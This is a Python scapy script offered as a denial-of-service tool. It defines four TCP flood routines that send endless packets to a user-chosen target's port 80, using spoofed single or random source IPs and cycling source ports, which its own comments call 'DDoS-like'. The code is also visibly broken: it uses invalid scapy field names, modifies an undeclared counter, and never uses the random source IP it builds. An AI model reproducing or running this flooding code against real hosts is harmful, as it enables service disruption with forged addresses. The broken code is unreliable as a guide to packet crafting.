import random
from scapy.all import IP,TCP,send

source_IP = input("Enter IP address of Source: ")
target_IP = input("Enter IP address of Target: ")
source_port = int(input("Enter Source Port Number:"))
i = 1

#  Single IP Source Port Flood
#  Sends a stream of TCP packets from the user-specified source IP to the target IP,
#  using the specified source port and destination port 80 (standard for HTTP).
def SISP():
    while True:
        IP1 = IP(source_IP = source_IP, destination = target_IP)
        TCP1 = TCP(srcport = source_port, dstport = 80)
        pkt = IP1 / TCP1
        send(pkt, inter = .001)
        
        print ("packet sent ", i)
        i = i + 1 
# Single IP Source Ports Flood
# Sends packets from the user-specified source IP to the target IP, 
# but this time it cycles through all possible source port numbers (from 1 to 65534).
def SIMP():
    while True:
        for source_port in range(1, 65535):
            IP1 = IP(source_IP = source_IP, destination = target_IP)
            TCP1 = TCP(srcport = source_port, dstport = 80)
            pkt = IP1 / TCP1
            send(pkt, inter = .001)
        
            print ("packet sent ", i)
            i = i + 1
# Multiple Random Source IPs Flood
# Sends packets using random source IPs (within the range 1.1.1.1 to 254.254.254.254) to the target IP. 
# This simulates a distributed source (DDoS-like) attack where many different IPs flood the target.
def MISP():
    while True:
        a = str(random.randint(1,254))
        b = str(random.randint(1,254))
        c = str(random.randint(1,254))
        d = str(random.randint(1,254))
        dot = "."
        
        Source_ip = a + dot + b + dot + c + dot + d
        IP1 = IP(source_IP = source_IP, destination = target_IP)
        TCP1 = TCP(srcport = source_port, dstport = 80)
        pkt = IP1 / TCP1
        send(pkt,inter = .001)
        print ("packet sent ", i)
        i = i + 1
# Multiple Random Source IPs and Source Ports Flood
# This combines both random source IPs and cycling through all possible source port numbers (from 1 to 65534), 
# sending packets to the target IP.
def MIMP():
    while True:
        a = str(random.randint(1,254))
        b = str(random.randint(1,254))
        c = str(random.randint(1,254))
        d = str(random.randint(1,254))
        dot = "."
        Source_ip = a + dot + b + dot + c + dot + d
        
        for source_port in range(1, 65535):
            IP1 = IP(source_IP = source_IP, destination = target_IP)
            TCP1 = TCP(srcport = source_port, dstport = 80)
            pkt = IP1 / TCP1
            send(pkt,inter = .001)
            
            print ("packet sent ", i)
            i = i + 1